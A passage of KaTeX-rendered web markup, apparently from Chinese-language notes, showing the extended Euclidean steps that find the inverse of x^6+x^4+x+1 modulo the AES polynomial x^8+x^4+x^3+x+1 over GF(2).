class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><msup><mi>x</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">1 = (x+1)(x^6+x^4+x+1)+(x^5+x^4+x^3+x^2+1)x^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 = (x+1)(x^6+x^4+x+1) + (x^5+x^4+x^3+x^2+1)((x^8+x^4+x^3+x+1)+(x^2+1)*(x^6+x^4+x^1+1))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 = (x^5+x^4+x^3+x^2+1)(x^8+x^4+x^3+x+1)+(x^7+x^6+x^3+1)(x^6+x^4+x+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>则我们可以得到多项式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>1</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^6+x^4+x^1+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span 